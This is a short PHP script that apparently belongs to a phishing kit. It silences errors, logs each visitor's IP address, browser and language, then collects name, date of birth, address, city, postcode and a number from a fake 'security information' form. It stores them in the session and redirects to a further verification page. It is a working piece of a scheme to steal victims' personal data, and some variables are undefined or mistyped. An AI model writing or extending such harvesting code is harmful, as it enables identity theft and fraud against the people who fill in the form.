<?php
error_reporting(0);
session_start();


$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;


$_SESSION['2'] = $GET['2'];

#Security information
$_SESSION['name'] = $_POST['1'];
$_SESSION['dob'] = $_POST['2'];
$_SESSION['adrress'] = $_POST['3'];
$_SESSION['province'] = $_POST['5'];
$_SESSION['city'] = $_POST['6'];
$_SESSION['zip'] = $_POST['7'];
$_SESSION['num'] = $_POST['8'];



 header("location:../verif.php");


		  ?>
